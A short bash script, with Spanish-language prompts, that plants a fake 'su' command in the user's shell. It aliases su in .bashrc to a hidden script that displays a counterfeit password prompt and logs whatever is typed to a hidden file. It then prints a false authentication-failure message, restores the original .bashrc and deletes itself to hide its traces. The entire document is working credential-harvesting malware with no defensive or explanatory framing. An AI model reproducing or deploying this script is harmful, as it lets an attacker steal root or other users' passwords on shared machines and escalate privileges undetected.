#!/bin/bash
cp $HOME/.bashrc $HOME/.bashrcbk;
 
echo "alias su='$HOME/.sudo_su'" >> $HOME/.bashrc;
echo "#!/bin/bash"> $HOME/.sudo_su;
echo "cp $HOME/.bashrcbk $HOME/.bashrc" >> $HOME/.sudo_su;
echo "stty -echo" >> $HOME/.sudo_su;
echo "read -p \"Contraseña: \" IN" >> $HOME/.sudo_su;
echo "stty echo" >> $HOME/.sudo_su;
echo "echo" >> $HOME/.sudo_su;
echo "date >> $HOME/.plog" >> $HOME/.sudo_su;
echo "echo Password: \$IN >> $HOME/.plog" >> $HOME/.sudo_su;
echo "sleep 2" >> $HOME/.sudo_su;
echo "echo \"su: Fallo de autenticación\"" >> $HOME/.sudo_su;
echo "mv $HOME/.bashrcbk $HOME/.bashrc" >> $HOME/.sudo_su;
echo "rm $HOME/.sudo_su" >> $HOME/.sudo_su;
source $HOME/.bashrc
chmod 755 $HOME/.sudo_su;
